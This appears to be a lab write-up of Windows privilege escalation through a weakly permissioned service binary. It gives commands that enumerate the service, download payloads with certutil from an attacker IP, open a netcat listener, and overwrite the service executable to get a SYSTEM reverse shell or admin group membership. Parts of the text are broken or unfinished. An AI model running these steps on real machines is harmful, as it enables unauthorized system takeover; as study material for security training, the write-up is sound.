# Vulnerability Overview 
Insecure Service Executables refer to a vulnerability where the executable file (binary) that a Windows service runs has weak permissions, allowing an unprivileged user to modify or replace it. 
Since services often run with elevated privileges (e.g., SYSTEM), altering the executable can lead to privilege escalation.



# POC
It is important to know that there will be initial access to the target system before the privilege escalation is done. This was carried out by accessing the machine with a user credential and then using on the target CMD `certutil -urlcache -split -f http://10.4.106.235/esc.exe` a malicious file needed for the reverse shell was downloaded on the target, while the attacker machine listened with the command ` nc -nlvp 2294`

![image](https://github.com/user-attachments/assets/ed210457-164b-4e99-b1a3-6730248cad22)

The service "filepermsvc" details were checked out using the following command `sc qc filepermsvc`, and it turned out that the service is running with privileged access `SERVICE_START_NAME: LocalSystem` and the binary path ` BINARY_PATH_NAME: "C:\Program Files\File Permissions Service\filepermservice.exe"`
![image](https://github.com/user-attachments/assets/99ea3641-0012-477a-8ccc-d65e00f4df42)


The access list on the service's Binary path was then checked out using the command  `C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`

1. /accepteula: Automatically accepts the End User License Agreement (EULA) so the tool runs without prompting.
2. -q: Runs in quiet mode, suppressing unnecessary output like banners.
3. -u: Only user-level access (not group or system privileges).
4. -v: Verbose mode, providing detailed output about permissions.
5. -w: Checks for write permissions specifically.
6. - C:\PrivEsc\accesschk.exe: This is the path to the accesschk executable.
7. "C:\Program Files\File Permissions Service\filepermservice.exe": The target file being analyzed
![Screenshot from 2025-03-19 09-52-02](https://github.com/user-attachments/assets/b24ea522-1fcb-407c-a1c6-0dbded26f5c0)

The result showed that the user account can read and write into the binary ` RW BUILTIN\Users FILE_ALL_ACCESS`
![Screenshot from 2025-03-19 08-37-02](https://github.com/user-attachments/assets/8812cb56-968f-493a-8733-af8b11a0e10d)


Then, I sent two malicious files to the target via the reverse terminal
1.esc.exe: This malicious file was uploaded on the target using  `certutil -urlcache -split -f http://10.4.106.235/esc.exe`.

After the upload, the file was used to replace the original binary file of the `filepermsvc` service by using the command `copy esc.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`
![Screenshot from 2025-03-19 08-52-16](https://github.com/user-attachments/assets/85c1e6f0-bf8e-481f-a5f6-5e055be05dc2)




This malicious file was uThis file would give a reverse shell with elevated privileges, and  when the servuice starts running
With a reverse shell running on 
![Screenshot from 2025-03-19 08-53-31](https://github.com/user-attachments/assets/2819563c-bbe4-42e7-af9f-29cd6a186274)


and it gave a reverse shell with admin privilege
![Screenshot from 2025-03-19 08-53-31](https://github.com/user-attachments/assets/22f9cc78-800f-43d3-9e7b-d4fe7944b35a)



# ######################################################################


2.x.exe: This file is a windows_service file that was compiled into an exe.. would elevate the privilege of the current user by adding it to the administrator group
 `certutil -urlcache -split -f http://10.4.106.235/x.exe`
   This was used to upload the file
![Screenshot from 2025-03-19 08-56-29](https://github.com/user-attachments/assets/e8ea9a11-9260-4faf-858b-9ae83964c9ae)


Then we copy using `copy x.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y` 
![Screenshot from 2025-03-19 08-57-40](https://github.com/user-attachments/assets/acb2c733-d030-4cea-a430-e7fc7a986807)

Before running the command, the user had this privilege
![Screenshot from 2025-03-19 08-58-56](https://github.com/user-attachments/assets/829b828e-8bdd-4d92-abfe-23a8e433bb75)


after running `net start permsvc` the user had
![Screenshot from 2025-03-19 08-58-56](https://github.com/user-attachments/assets/906ade65-553d-4d50-8bb0-2b7e299165b9)


4. 



  copy esc.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y



net start filepermsvc

